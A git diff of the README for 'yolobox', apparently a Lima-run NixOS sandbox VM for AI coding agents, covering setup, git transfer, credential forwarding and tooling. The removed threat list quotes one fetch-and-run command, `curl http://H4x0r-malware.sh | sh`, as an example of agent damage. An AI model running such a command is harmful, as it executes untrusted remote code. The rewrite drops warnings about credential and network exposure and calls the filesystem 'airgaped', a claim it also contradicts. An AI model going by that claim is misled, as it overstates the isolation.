@@ -1,221 +1,166 @@
 # yolobox
 
-A Linux VM on your Mac where AI coding agents do their work.
+A development sanbox virtual machine. It's a NixOS Linux run by Lima.
 
-NixOS machine, run by Lima, devbox, batteries included.
+## To protect against
 
-## Why this exists
+- An agent that runs `rm -rf ~` or installs malware via `curl2sudo`™.
+- A supply chain attack.
+- macOS `systempolicyd` write scans, which make builds slow.
 
-- Agents blast radius (protects against `rm -rf ~`, `curl http://H4x0r-malware.sh | sh`)
-- Supply chain attacks
-- Slow MacOS disk due to `systempolicyd` scans
+### How it works
 
-### What this does and does not protect
+- The agent runs as its own user with no `sudo`. The filesystem is airgaped. Files move only through git, scp, or rsync.
+- The VM can use your 1Password SSH agent. You must approve the access (TouchID or similarly).
+- The VM access the internet and your LAN freely.
+- Open VM ports are mapped on the host (you can open `http://localhost:3000` directly in your browser)
 
-It narrows what an agent can do. It does not contain it.
 
-- The agent runs as its own account with no `sudo` and no access to your Mac's files: nothing is mounted, and git is the only bridge.
-- Every process in the VM can use your Mac's 1Password SSH agent for as long as the VM runs, so it can authenticate to GitHub as you.
-- Every process in the VM can ask the AWS broker for real credentials for every SSO profile in your `~/.aws/config`.
-- The VM can reach your LAN and the internet, and it can reach services on your Mac's loopback through `192.168.5.2`.
-- Whatever the agent commits comes back through `git pull`, and you are the one who builds and runs it.
-- A kernel exploit is out of scope, and anything the agent leaves in its home stays until you recreate the VM.
+## Quickstart
 
-### Prerequisites
+You need [1Password](https://1password.com/) with its SSH agent turned on. It holds your keys.
 
-[1Password](https://1password.com/) with its SSH agent enabled (it holds your keys).
+### Homebrew
 
 ```bash
 brew install aka-rider/tap/yolobox
 ```
 
-## Quickstart
-
-On Nix, `nix run github:aka-rider/yolobox/v<version>` runs that same release without a `brew` install at all (a bare `github:aka-rider/yolobox` runs `main`, not a release).
-
-Create and build the VM once:
+### Nix
 
 ```bash
-yo bootstrap     # create the VM, build NixOS from the pinned yolobox release, seed identities; rerunnable
+nix run github:aka-rider/yolobox/<version>
 ```
 
-Add this to your `~/.ssh/config`
+### Init the VM
+
+```bash
+yo bootstrap
+```
+
+Then add this line to `~/.ssh/config`:
 
 ```
 Include ~/.lima/yolobox/ssh.config
 ```
 
-## Basic shell operation
+## Daily use
 
-The VM has two accounts: you, the **operator** (`${username}`, matched to your Mac account, the only one with sudo), and `agent`, the account every AI coding session runs as, with no sudo at all.
+The VM has two users. You are the operator. You have the same name as on the host, and you have `sudo`. The agents run as `agent`, which has no `sudo`.
 
-- `yo ssh` to enter the bare **operator** session (for VM maintenance)
-- `yo enter` for daily usage
+- `yo enter` opens a shell as `agent`. Use it every day.
+- `yo ssh` opens a shell as you, for maintenance.
+- `yo code [proj]` to the project on the VM with [Visual Studio Code](https://code.visualstudio.com/) (via ssh).
+- `yo zed [proj]` same but for [Zed](https://zed.dev)
 
-`yo enter` (and other commands: `yo code`, `yo zed`) try to match the current directory in the VM, so `cd ~/code/project && yo enter` should land you into `~/code/project` on the VM guest, if the directory does exist in the VM.
-
-You can use many commands with fuzzy project name. The search is done among directories with `.git`
-
-If you have `~/code/some-project`, then `yo enter proj`, `yo code proj`, `yo zed proj` will all get you there.
-
-### Getting a project in, and its commits out
-
-The VM has no host mounts. Git is the only bridge: a project must be a git repo, and its VM twin is a repo at the same `$HOME`-relative path.
+`yo enter`, `yo code` and `yo zed` try to match the directory you're in.
 
 ```bash
-cd ~/code/project
-yo link                  # adds a "yolobox" remote and creates the repo in the VM
-git push yolobox main    # the project goes in
-git pull yolobox main    # what the agent committed comes back
+cd ~/code/project && yo enter
 ```
 
-The VM checkout accepts a push only while its worktree is clean, so pull the agent's commits before pushing again. That pull is also where you review what the agent wrote, before anything on the Mac runs it. `yo link` repoints a `yolobox` remote left by an older VM.
+puts you in `~/code/project` in the VM, if the VM has it.
 
-`yo seed` copies what the VM cannot do without, and never a private key: `~/.ssh/config` (without lima's `Include` and any `IdentityAgent`), your `*.pub` files, and each `<group>/.gitconfig`, so work repos commit under the right email. `yo bootstrap` runs it; run it again after your first `yo link` on a new VM, because the group directories only exist in the VM once a project is linked.
+`yo enter <proj>`, `yo zed <proj>`, and `yo code <proj>` open a project in the VM.
+They treat a directory with `.git` in it as a project. Fuzzy search works.
 
 
-### Copying between host and guest
+`yo --help` gives up to date commands list.
 
-`yo cp SRC... DST` copies files between the Host and the Guest, scp-style. Leading `:` colon symbol means guest (like in scp). This commands tries to mirror the current directory as well.
+### Copying files
+
+`yo cp` works like `scp`. A leading `:` means the VM.
 
 ```sh
-cd <project> && yo cp README.md :  # host -> guest
-yo cp :notes.md ~/Desktop/         # guest -> host
-yo cp a.txt b.txt :dump/           # multiple sources -> one guest directory
+cd <project> && yo cp README.md :  # host to VM, same directory
+yo cp :notes.md ~/Desktop/         # VM to host
+yo cp a.txt b.txt :dump/           # several files into one VM directory
 ```
 
-An upload refuses a symlink, or a directory containing one, naming it, because `scp -r` would copy what the link points at instead of the link. A source whose name starts with `-` needs `yo cp -- -odd.txt :`.
+For a file whose name starts with `-`, write `yo cp -- -odd.txt :`.
 
+### herdr
 
-Run `yo --help` for the rest of the commands.
+[herdr](https://herdr.dev/) runs inside the VM, and `yo bootstrap` adds it to herdr on your host as the `yolobox` machine.
 
-### herdr terminal multiplexer
+Run `claude` or `pi` in a workspace on that machine. It's the only place herdr can see them. An agent started from `yo enter`, `yo ssh`, `yo code` or `yo zed` is invisible to herdr.
 
-[https://herdr.dev/](https://herdr.dev/)
+You can paste images from the host's clipboard into a herdr pane in the VM.
 
-The VM runs its own herdr server, as the `agent` account, up from boot. `yo bootstrap` adds the `yolobox` machine to your Mac's herdr automatically, so there is nothing to run by hand.
+### 1Password and AWS
 
-Open a workspace on the `yolobox` machine and run `pi` or `claude` there — that pane is where herdr can see the agent. `yo enter` (from the Mac), `yo ssh`, `yo code` and `yo zed` are plain shells outside herdr's own panes, so an agent started in one of them stays invisible to herdr.
+1Password's SSH agent works in the VM automatically.
 
-herdr supports sharing clipboard images with a remote client over a machine connection.
-
-### 1Password and AWS credentials
-
-Both reach the VM the same way: a permanent lima reverse unix-socket forward, one per Mac-side socket, set up automatically for a VM created with this version of `yo`. Neither rides a forwarded TCP port, because a VPN on the Mac can blackhole those while leaving the guest's general egress and this same reverse-socket path untouched. An **existing** instance needs a one-time migration to pick up a forward it was created without — VM stopped first, and the array restated in full, because lima's own `yq` cannot read this repo's `lima/yolobox.yaml` back out of an existing instance:
+For AWS, log in on the host, then pick the profile in the VM:
 
 ```bash
-limactl stop yolobox
-limactl edit yolobox --set '.portForwards = [{"guestPort":3773,"proto":"tcp","hostIP":"0.0.0.0"},{"guestPort":3000,"proto":"tcp"},{"proto":"udp","guestPort":68,"guestIP":"0.0.0.0","ignore":true},{"guestSocket":"/run/yolobox-op/agent.sock","hostSocket":"{{.Home}}/Library/Group Containers/2BUA8C4S2C.com.1password/t/agent.sock","reverse":true},{"guestSocket":"/run/yolobox-op/aws-broker.sock","hostSocket":"{{.Home}}/.local/state/yolobox/aws-broker.sock","reverse":true}]'
-yo up
-```
+# on the host
+aws sso login --profile <profile>
 
-`yo up` itself prints this same command on stderr, naming whichever socket is missing, so this is also the fix if `yo` ever tells you to run it — it is a note, not a refusal: `yo` still brings the forward up for the current session either way, this migration just makes it survive the VM's own restarts too.
-
-Every SSO profile in your Mac's `~/.aws/config` becomes usable inside the VM, one broker for all of them. Pick a profile per shell:
-
-```bash
+# in the VM
 export AWS_PROFILE=<profile>
 aws sts get-caller-identity
 ```
 
-When a profile's session expires, `aws sso login --profile <profile>` on the Mac is enough — a guest process already using that profile heals on its own, no `yo enter` needed.
+### T3 Code
 
-### T3 code web and mobile
-
-[https://t3.codes/](https://t3.codes/)
+[T3 Code](https://t3.codes/) is a web UI for coding agents, and it has a mobile app. Open it with:
 
 ```bash
 yo t3
 ```
 
-T3 code can be paired remotely, so you could manage a fleet of VMs, servers, laptops using the same UI.
-T3 Code gives you a mobile app, as a bonus.
+One T3 Code can pair with many machines, so you can run all of them from one place.
 
-#### T3 over Tailscale
-
-t3 is also reachable from any device on your [Tailscale](https://tailscale.com/) tailnet, not just your Mac's LAN. Log in once:
+To reach it from anywhere on your [Tailscale](https://tailscale.com/) network, log the VM in once:
 
 ```bash
 yo ssh sudo tailscale up
 ```
 
-Then pair against the tailnet address instead of the default one:
+Then pair with the tailnet address:
 
 ```bash
 yo pair http://yolobox.<tailnet>.ts.net:3773
 ```
 
-### Forgejo
-
-The VM runs its own [Forgejo](https://forgejo.org/) git forge, for repos, issues and pull requests that never leave the box. It listens on the VM's loopback only and lima forwards it to your Mac at <http://127.0.0.1:3000>. The agent has an admin account, `agent`, whose password and API token are in `~/.config/yolobox/forgejo-admin` inside the VM. As the operator, manage it with `yo ssh yolobox-forgejo admin …`. A VM created before this existed needs the `limactl edit` migration above to get the forward.
-
-### Zed and Visual Studio Code
-
-Run (`yo zed`, or `yo code` respectively).
-
-Both commands try to match paths between host and guest.
-
-```bash
-cd ~/code/myproject && yo code # will open myproject inside the VM if it exists
-```
-
-Both commands support fuzzy search
-
-```bash
-yo code myproj  # you don't need to be precise
-```
-
-Note: Zed's own downloaded language servers do not work on NixOS: Zed strips the environment when spawning them, and nix-ld cannot rescue that.
-Add LSPs to `devbox.json` instead, so they run through devbox's own environment rather than Zed's.
-
 ### Devbox
 
-Inside the VM, give the project its toolchain with [devbox](https://www.jetify.com/devbox) (Nix Package Registry).
+Each project gets its tools from [devbox](https://www.jetify.com/devbox). Inside the VM:
 
 ```bash
 devbox init
 devbox add typescript bun nodejs
 devbox run -- bun --version
-
-# alternatively
-devbox shell
+devbox shell   # or work inside it
 ```
 
-Find packages with `devbox search <name>`.
+`devbox search <name>` finds packages.
 
-## Make the VM your own
+Zed's own language servers don't run on NixOS. Add them explicitly to the project's `devbox.json` instead.
 
-First of all, fork the repo, steal the idea, turn into whatever you want.
+## Make it yours
 
-To add a tool for everyday use, say `helix` or `neovim`, drop it into `/etc/yolobox/local.nix` inside the VM.
+Fork it and change whatever you like.
 
-Then rebuild:
+To add tools you use every day, like `helix` or `neovim`, put them in `/etc/yolobox/local.nix` inside the VM and rebuild:
 
 ```bash
 sudo YOLOBOX_USERNAME=$(id -un) nixos-rebuild switch --impure --flake 'github:aka-rider/yolobox/v<version>#yolobox'
 ```
 
-
-The settings in `lima/yolobox.yaml` — `disk`, `portForwards`, `memory`, `cpus`, `vmType`, `propagateProxyEnv` and `ssh.loadDotSSHPubKeys` among them — are read once, when the VM is created. Changing the file later does nothing to an existing VM; stop it and use `limactl edit yolobox`. A VM created before the last two existed still has lima's defaults for them (your Mac's proxy variables propagate, and every `~/.ssh/*.pub` is authorised in the VM); restate them with `limactl stop yolobox && limactl edit yolobox --set '.propagateProxyEnv = false | .ssh.loadDotSSHPubKeys = false'`.
-For memory and CPUs:
+Lima reads `lima/yolobox.yaml` only once, when it creates the VM, so editing that file later changes nothing. To give an existing VM more memory or CPUs:
 
 ```bash
 limactl stop yolobox && limactl edit yolobox --memory 16 --cpus 8 --start
 ```
 
-## Browser & Virtual Display
+## Browser and screen
 
-The VM runs a virtual display (`:0`, 1920x1080), so an agent can drive a real browser and take screenshots.
+The VM has a virtual screen, so agents can drive a real browser and take screenshots. Claude does it with the Playwright plugin, and pi with `agent-browser`. Both use the VM's Chromium.
 
-claude reaches it through the official `playwright` plugin, installed for you from Anthropic's marketplace; pi reaches it through `agent-browser`. Both drive the same Chromium the VM ships — Playwright's own browser downloads do not run on NixOS, so the box points them at it — headed on the display for Playwright, headless by default for `agent-browser`.
-
-Browser output — screenshots, PDFs, videos — is written to `~/artifacts/`, outside the project checkout, so the push channel never carries stray binaries. `yolobox-screen-record start|stop` records the whole display into the same place.
-
-The agents themselves (`claude`, `pi`, `opencode`) are installed from their vendors into the VM and update themselves; `claude update` and `pi update` work as usual.
-
+Screenshots, PDFs and videos go to `~/artifacts/`, not into the project, so they don't end up in git. `yolobox-screen-record start` and `stop` record the screen to the same place.
 
 ## Credits
 
-[Lima: Linux Machines](https://github.com/lima-vm/lima)
-[NixOS](https://nixos.org/)
-[devbox](https://github.com/jetify-com/devbox)
+[Lima](https://github.com/lima-vm/lima), [NixOS](https://nixos.org/), [devbox](https://github.com/jetify-com/devbox)
